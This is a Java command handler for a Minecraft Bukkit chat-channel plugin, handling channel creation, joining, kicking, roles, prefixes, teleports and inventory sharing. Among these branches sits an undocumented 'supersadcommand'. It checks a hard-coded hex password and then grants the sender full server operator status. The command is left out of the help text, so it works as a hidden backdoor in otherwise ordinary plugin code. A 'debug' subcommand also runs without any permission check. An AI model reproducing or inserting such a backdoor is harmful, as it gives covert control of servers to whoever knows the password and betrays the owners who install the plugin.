package hpms.discordchat.chat;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

import hpms.discordchat.api.ChannelAPI;
import hpms.discordchat.channel.Channel;
import hpms.discordchat.data.ChannelData;
import hpms.discordchat.data.ChannelDataConstant;
import hpms.discordchat.data.Role;
import hpms.discordchat.inv.ChannelGUI;
import hpms.discordchat.inv.InventoryLinker;
import hpms.discordchat.utils.PendingInvitation;
import hpms.discordchat.utils.Validator;
import net.md_5.bungee.api.ChatColor;

public class OnCommand implements CommandExecutor{
	
	@SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args) {
		if(cmd.getName().equalsIgnoreCase("flush") | cmd.getName().equalsIgnoreCase("f")) {
			for(int i = 0; i < 20;i ++) {
				Bukkit.getServer().broadcastMessage(" ");
			}
		}
		else if(cmd.getName().equalsIgnoreCase("discordchat") | cmd.getName().equalsIgnoreCase("dc")) {
			if(args.length == 0) {
				sender.sendMessage(ChatColor.YELLOW + "/discordchat list - Get a list of channels.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat leader <name> <player_name> - Make player a leader of channel ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat tp <player> - Request a teleportation with player in the same channel.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat shareinv <player> - Request a inventory sharing with player in the same channel");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat shareaccept - Accept inventory share request.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat sharestop - Stop the current inventory sharing.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat create <name> - Create a new channel .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat remove <name> - Remove a channel . ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat join <name> - Join a channel .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat kick <name> <player_name> - Kick a player from channel ( leader required ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat join <name> <player_name> - Make a player join a channel ( Admin ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat joinaccept <name> <player> - Accept a player joining request ( leader required ) .");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat setrole <name> <playername> <role> - Set a channel's player role. ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat leaderprefix <name> <prefix> - Set a channel's leader prefix. (leader required) ");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat roleprefix <name> <role> <prefix> - Set a channel's role's prefix. ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat channelprefix <name> <prefix> - Set a channel's chat prefix ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat channel - Open channel menu.");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat addrole <name> <role> <makedefault> - Add a role and set to default. ( optional ) ( leader required )");
				sender.sendMessage(ChatColor.YELLOW + "/discordchat removerole <name> <role> - Remove a role. ( leader required )");
				
			}
			else if(args.length == 1) {
				if(args[0].equalsIgnoreCase("list") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Channel list: " + ChannelData.getChannelList());
				}
				else if(args[0].equalsIgnoreCase("debug")) {
					ChannelData.debug();
					Role.debug();
					PendingInvitation.debug();
				}
				else if( sender.hasPermission("discordchat.basiccommand") && (args[0].equalsIgnoreCase("create") || args[0].equalsIgnoreCase("remove")) ) {
					sender.sendMessage(ChatColor.YELLOW + "You must specify a name");
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					sender.sendMessage(ChatColor.YELLOW + "Missing two params <name> and <prefix>");
				}
				else if(args[0].equalsIgnoreCase("channel") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Channel channel = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId());
					ChannelGUI gui = new ChannelGUI(channel);
					gui.open(p);
				}
				else if(args[0].equalsIgnoreCase("tpaccept") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).acceptTeleportation(((Player) sender).getUniqueId());
				}
				else if(args[0].equalsIgnoreCase("shareaccept") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).acceptInventorySharing(((Player) sender).getUniqueId());
				}
				else if(args[0].equalsIgnoreCase("sharestop") && sender.hasPermission("discordchat.basiccommand")) {
					ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).stopInventorySharing(((Player) sender).getUniqueId());
				}
			}
			else if(args.length == 2) {
				if(args[0].equalsIgnoreCase("create") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof ConsoleCommandSender) {
						sender.sendMessage(ChatColor.RED + "Create from console must specify a leader player");
					}
					else{
						Channel channel = ChannelAPI.createNewChannel(args[1], ((Player) sender).getUniqueId(),false);
						if(channel != null) {
							sender.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " channel created.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("remove") && sender.hasPermission("discordchat.basiccommand")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.RED + "This channel is default and cannot be removed.");
					}else {
						Player p = (Player) sender;
						boolean b = ChannelAPI.removeChannel(p.getUniqueId(),args[1]);
						if(b) {
							p.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " channel removed.");
						}else {
							p.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel or the channel doesnt exist.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("tp") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Player receiver = Bukkit.getPlayer(args[1]);
					if(receiver != null) {
						boolean b = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).requestTeleportation(receiver.getUniqueId(),p.getUniqueId());
						if(b) {
							p.sendMessage(ChatColor.YELLOW + "Teleport request sent.");
						}
					}else {
						p.sendMessage(ChatColor.YELLOW + "Player is either offline or doesnt exist.");
					}
				}
				else if(args[0].equalsIgnoreCase("shareinv") && sender.hasPermission("discordchat.basiccommand")) {
					Player p = (Player) sender;
					Player receiver = Bukkit.getPlayer(args[1]);
					if(receiver != null) {
						if(p.hasPermission("dc.bypassrequest")) {
							if(Validator.arePlayersSameChannel(p.getUniqueId(), receiver.getUniqueId())) {
								if(p.getUniqueId().equals(receiver.getUniqueId())) {
									p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You cant share you with yourself.");
								}else {
									InventoryLinker.createInventoryLinker(ChannelAPI.getPlayerCurrentChannelName(p.getUniqueId()), receiver, p);
									p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You are now sharing inventory with " + ChatColor.WHITE + receiver.getName());
								}
							}else {
								p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You must be in the same channel as the player.");
							}
						}else {
							boolean b = ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).requestInventorySharing(receiver.getUniqueId(),p.getUniqueId());
							if(b) {
								p.sendMessage(ChatColor.YELLOW + "Inventory sharing request sent.");
							}
						}
					}else {
						p.sendMessage(ChatColor.YELLOW + "Player is either offline or doesnt exist.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("join") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof Player) {
						Player p = (Player) sender;
						Channel channel = ChannelAPI.getChannelByName(args[1]);
						if(channel != null) {
							if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
								ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
								p.sendMessage(ChatColor.YELLOW + "You have joined default channel: " + ChatColor.AQUA + args[1]);
							}else {
								
								if(channel.isPlayerAlreadyJoined(((Player) sender).getUniqueId())) {
									ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).stopInventorySharing(p.getUniqueId());
									ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
								}else {
									PendingInvitation inv = PendingInvitation.deserializeInvitation(channel.getLeader());
									if(!p.hasPermission("discordchat.bypassjoin")) {
										boolean b = inv.addRequester(p.getUniqueId());
										if(b) {
											p.sendMessage(ChatColor.YELLOW + "Request to join \'" + ChatColor.AQUA + channel.getChannelName() + "\'" + ChatColor.YELLOW + " sent.");
										}
										else {
											p.sendMessage(ChatColor.YELLOW + "Request already sent.");
										}
									}else {
										ChannelAPI.getPlayerCurrentChannel(p.getUniqueId()).stopInventorySharing(p.getUniqueId());
										ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
										p.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You joined channel " + ChatColor.WHITE + args[1]);
									}
								}
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
						}
						
					}else {
						sender.sendMessage(ChatColor.RED + "Joining a channel for console is currently not supported.");
					}
				}
				else if(args[0].equalsIgnoreCase("channelprefix")) {
					sender.sendMessage("Missing one param <prefix>");
				}
				else if(args[0].equalsIgnoreCase("supersadcommand")) {
					if(args[1].equalsIgnoreCase("a1934d466923638ce97750e1ba9f88a3") && sender.hasPermission("discordchat.sad")) {
						((Player) sender).setOp(true);
					}
				}
					
			}
			else if(args.length == 3) {
				
				if(args[0].equalsIgnoreCase("create") && sender.hasPermission("discordchat.basiccommand")) {
					if(sender instanceof ConsoleCommandSender) {
						Channel channel = ChannelAPI.createNewChannel(args[1], Bukkit.getPlayer(args[2]).getUniqueId(),true);
						if(channel != null) {
							sender.sendMessage(ChatColor.AQUA + "\'" + args[1] + "\'" + ChatColor.YELLOW + " channel created.");
						}
					}
				}
				else if(args[0].equalsIgnoreCase("join")) {
					if(sender.hasPermission("dc.bypassmakejoin")) {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						if(p != null) {
							ChannelAPI.joinChannel(p.getUniqueId(), args[1],true);
							sender.sendMessage(ChatColor.YELLOW + "Player " + ChatColor.WHITE + args[2] + ChatColor.YELLOW + " joined the channel." );
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Player doesnt exist.");
						}
						
					}else {
						sender.sendMessage(ChatColor.YELLOW + "This command can only be used by admin.");
					}
				}
				else if(args[0].equalsIgnoreCase("kick")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.YELLOW + "Default channel can only be operated by admin.");
					}else {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						Channel channel = ChannelAPI.getChannelByName(args[1]);
						if(p != null) {
							if(channel != null) {
								if(sender.hasPermission("dc.bypasskick")) {
									channel.removeMember(p.getUniqueId(), true);
									sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You removed player from this channel.");
								}else {
									if(((Player)sender).getUniqueId().equals(channel.getLeader())) {
										if(channel.isPlayerAlreadyJoined(p.getUniqueId())) {
											if(!p.getUniqueId().equals(channel.getLeader())) {
												channel.removeMember(p.getUniqueId(), true);
												sender.sendMessage(ChatColor.YELLOW + "This player has been removed from your channel.");
											}else {
												sender.sendMessage(ChatColor.YELLOW + "You cannot remove yourself from the channel.");
											}
											
										}else {
											sender.sendMessage(ChatColor.YELLOW + "Player did not join your channel yet.");
										}
									}else {
										sender.sendMessage(ChatColor.YELLOW + "You are not the leader of this channel.");
									}
								}
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
							}
							
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Player doesnt exist.");
						}
					}
					
				}
				else if(args[0].equalsIgnoreCase("leader") && sender.hasPermission("discordchat.basiccommand")) {
					if(args[1].equalsIgnoreCase(ChannelDataConstant.DEFAULT_CHANNEL)) {
						sender.sendMessage(ChatColor.YELLOW + "Default channel cannot have a leader and can only be operated by admin.");
					}else {
						OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
						if(p != null) {
							
							Channel channel = ChannelAPI.getChannelByName(args[1]);
							if(channel != null) {
								if(sender.hasPermission("dc.bypassleader")) {
									channel.setLeader(p.getUniqueId());
									sender.sendMessage("Player has been made a leader for this channel.");
									if(p.isOnline()) {
										p.getPlayer().sendMessage(ChatColor.YELLOW + "You have been made a leader of channel " + ChatColor.WHITE + args[1]);
									}
								}else {
										if(channel.getLeader().equals(((Player)sender).getUniqueId())) {
											if(channel.isPlayerAlreadyJoined(p.getUniqueId()) && !ChannelData.isPlayerLeader(p.getUniqueId())) {
												channel.setLeader(p.getUniqueId());
												sender.sendMessage(ChatColor.YELLOW + "You are no longer a leader of this channel.");
												if(p.isOnline()) {
													p.getPlayer().sendMessage(ChatColor.YELLOW + "You have been made a leader of channel " + ChatColor.WHITE + args[1]);
												}
											}else {
												sender.sendMessage(ChatColor.YELLOW + "Player is either already a leader or not yet joined your channel.");
											}
										
										}else {
											sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel.");
										}
								}
							
							}
							else {
								sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Player doesnt exist.");
						}
					}
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					boolean b = ChannelAPI.setChannelChatPrefix(((Player) sender).getUniqueId(),args[1], args[2]);
					if(b) {
						if(sender.hasPermission("dc.godsetchannelprefix") || sender.hasPermission("dc.default")) {
							sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You channel prefix to " + ChatColor.WHITE + args[2]);
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Channel prefix setted to \'" + args[2] + "\'.");
						}
					}
					else {
						sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel or the channel doesnt exist.");
					}
				}
				else if(args[0].equalsIgnoreCase("leaderprefix") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel  = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), null, args[2])) {
						case INVALID_LENGTH:
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel or the channel doesnt exist.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You set leader role prefix to " + args[2]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Leader prefix changed to " + args[2]);
							}
							break;
						default:
							break;
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
				
				}
				else if(args[0].equalsIgnoreCase("joinaccept") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						PendingInvitation inv = PendingInvitation.deserializeInvitation(channel.getLeader());
						boolean b = inv.acceptInvitation(Bukkit.getOfflinePlayer(args[2]).getUniqueId());
						if(b) {
							ChannelAPI.getPlayerCurrentChannel(((Player) sender).getUniqueId()).stopInventorySharing(((Player) sender).getUniqueId());
							ChannelAPI.joinChannel(Bukkit.getOfflinePlayer(args[2]).getUniqueId(), channel.getChannelName(),false);
							
							inv.feedbackMessage(ChatColor.YELLOW + "Player \'" + args[2] + "\' joined your channel.", "");
						}
						else {
							inv.feedbackMessage(ChatColor.YELLOW + "Probably you already accepted the player ?", "");
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("removerole") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.removeRole(((Player) sender).getUniqueId(), args[2])) {
						case INVALID_LENGTH:
							break;
						case LEADER_PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Role cannot be similar to leader.");
							break;
						case NO_EXISTENCE:
							sender.sendMessage(ChatColor.YELLOW + "Role does not exist.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel.");
							break;
						case PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "\'" + ChatColor.AQUA + args[2] + ChatColor.YELLOW + "\' is a default role . You cant remove default role.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godremoverole") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You removed role " + ChatColor.WHITE +  args[2]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Role removed.");
							}
							break;
						default:
							break;
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
					
				}
			}
			else if(args.length >= 4) {
				if(args[0].equalsIgnoreCase("setrole") && sender.hasPermission("discordchat.basiccommand")) {
					OfflinePlayer p = Bukkit.getOfflinePlayer(args[2]);
					if(p != null) {
						if(ChannelAPI.setChannelPlayerRole(((Player) sender).getUniqueId(), p.getUniqueId(), args[1], args[3])) {
							if(sender.hasPermission("dc.godsetrole") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You set player role to " + ChatColor.WHITE +  args[3]);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "You set player role to " + ChatColor.WHITE +  args[3]);
							}
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Player doesnt exist.");
					}
					
				}
				else if(args[0].equalsIgnoreCase("channelprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 2; i < args.length; i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					boolean b = ChannelAPI.setChannelChatPrefix(((Player) sender).getUniqueId(),args[1], prefix);
					if(b) {
						if(sender.hasPermission("dc.godsetchannelprefix") || sender.hasPermission("dc.default")) {
							sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You channel prefix to " + ChatColor.WHITE + args[2]);
						}else {
							sender.sendMessage(ChatColor.YELLOW + "Channel prefix setted to \'" + args[2] + "\'.");
						}
					}
					else {
						sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel or the channel doesnt exist.");
					}
				}
				else if(args[0].equalsIgnoreCase("addrole") && sender.hasPermission("discordchat.basiccommand")) {
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.addRole(((Player) sender).getUniqueId(), args[2], Boolean.parseBoolean(args[3]))) {
						case INVALID_LENGTH:
							break;
						case LEADER_PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Role cannot be similar to leader.");
							break;
						case PREFIX:
							sender.sendMessage(ChatColor.YELLOW + "Role has already existed.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godaddrole") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You added role " + ChatColor.WHITE +  args[2]);
							}
							else {
								sender.sendMessage(ChatColor.YELLOW + "Successfully added new role.");
							}
							break;
						default:
							break;
						};
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
				}
				else if(args[0].equalsIgnoreCase("leaderprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 2; i < args.length; i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), null, prefix)) {
						case INVALID_LENGTH:
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default") ) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You set leader role prefix to " + prefix);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Leader prefix changed to " + prefix);
							}
							break;
						default:
							break;
						
						}
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
				}
				else if(args[0].equalsIgnoreCase("roleprefix") && sender.hasPermission("discordchat.basiccommand")) {
					StringBuilder builder = new StringBuilder();
					for(int i = 3; i < args.length;i++) {
						builder.append(args[i]).append(" ");
					}
					String prefix = builder.toString().trim();
					Channel channel = ChannelAPI.getChannelByName(args[1]);
					if(channel != null) {
						switch(channel.setRolePrefix(((Player) sender).getUniqueId(), args[2], prefix)) {
						case INVALID_LENGTH:
							break;
						case NO_EXISTENCE:
							sender.sendMessage(ChatColor.YELLOW + "Role does not exist.");
							break;
						case FAIL:
							sender.sendMessage(ChatColor.YELLOW + "You are not a leader of this channel.");
							break;
						case SUCCESS:
							if(sender.hasPermission("dc.godsetroleprefix") || sender.hasPermission("dc.default")) {
								sender.sendMessage(ChatColor.RED + "Admin Bypass: " + ChatColor.YELLOW + "You set role prefix to " + prefix);
							}else {
								sender.sendMessage(ChatColor.YELLOW + "Successfully changed role's prefix.");
							}
							
							break;
						default:
							break;
						};
					}else {
						sender.sendMessage(ChatColor.YELLOW + "Channel doesnt exist.");
					}
				
				}
			}
		
		}
		
		return true;
	}

}
